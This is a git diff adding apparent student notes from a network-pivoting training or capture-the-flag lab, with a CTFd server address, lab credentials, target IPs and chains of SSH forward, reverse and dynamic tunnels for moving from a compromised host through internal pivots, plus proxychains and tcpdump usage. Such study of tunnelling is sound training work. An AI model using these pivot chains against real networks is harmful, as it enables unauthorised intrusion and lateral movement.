@@ -96,4 +96,72 @@ terminator
 
 https://app.diagrams.net/#Hsreese6%2FReese.github.io%2Fmaster%2FUntitled%20Diagram.drawio
 
+---------------------------------------------------------------------------------------------
+/////////////////////////////////////////////////////////////////////////////////////////////
+---------------------------------------------------------------------------------------------
+http://10.50.28.241:8000/user    ------------------- ctfd server
+
+40900-40999
+net4_student09:password09
+
+T3 (Atropia) IP address is - 10.50.23.148
+T4 (Pineland) IP address is - 10.50.22.80 
+
+
+
+ssh net4_student9@10.50.23.148 -L 40920:localhost:22 -NT
+ssh net4_student9@localhost -p 40920 -L 40921:10.4.0.1:22 -NT
+ssh net4_student9@localhost -D 9050 -p 40921 -NT
+
+inside$ ssh netX_studentX@{T3_inside_ip} -R NssXX:localhost:22 -NT
+internet_host$ ssh netX_studentX@{T3_float_ip} -L NssXX:localhost:NssXX -NT
+internet_host$ ssh netX_studentX@localhost -p NssXX -L NssXX:10.2.0.2:80 -NT
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Task 3-1
+
+net4_student9@ctf2-net-ssh-01:~$ ssh student@10.50.31.49 -R 40940:localhost:22 -NT
+student@internet-host-student-9:~$ ssh net4_student9@localhost -D 9050 -p 40940 -NT
+
+
+
+
+
+
+
+
+//////////////////////////////////////////////////////////
+
+***building a multipart tunnel*
+
+From initial compromise host, build a reverse back to float IP of my host, targeting the next pivot
+ 	net4_student9@ctf2-net-ssh-01:~$ ssh student@10.50.31.49 -R 40950:192.168.0.40:5555 -NT
+ 	
+From internet host, build a forward tunnel to allow a telnet connection 
+ 	student@internet-host-student-9:~$ ssh net4_student9@localhost -p 40950 -L 40948:172.16.0.60:23 -NT
+ 	
+>>>>>>> telnet localhost 40948
+ 	
+from the telnet connection, build a reverse connection through the pivot
+ 	net4_student9@ctf2-net-ssh-06:~$ ssh net4_student9@192.168.0.40 -p 5555 -R 40951:localhost:22 -NT
+ 	
+Build a forward tunnel from internet host using the port numbers already established, connects through the next pivot
+ 	student@internet-host-student-9:~$ ssh net4_student9@localhost -p 40950 -L 40952:localhost:40951 -NT
+ 	
+build an additional forward tunnel to access the final pivot
+ 	student@internet-host-student-9:~$ ssh net4_student9@localhost -p 40952 -L 40953:172.16.0.90:2222 -NT
+ 	
+Dynamic tunnel changes based on the destination and the last -L port number used
+ 	student@internet-host-student-9:~$ ssh net4_student9@localhost -D 9050 -p 40953 -NT
+ 	
+Use proxychains, which relies on the dynamic tunnel
+ 	student@internet-host-student-9:~$ proxychains telnet 172.16.0.100
+
+
+/////////////////////////////////////////////////////////////
+
+ tcpdump -i eth0 -s 100 port not 23 -X | hexdump -c
+
+
 
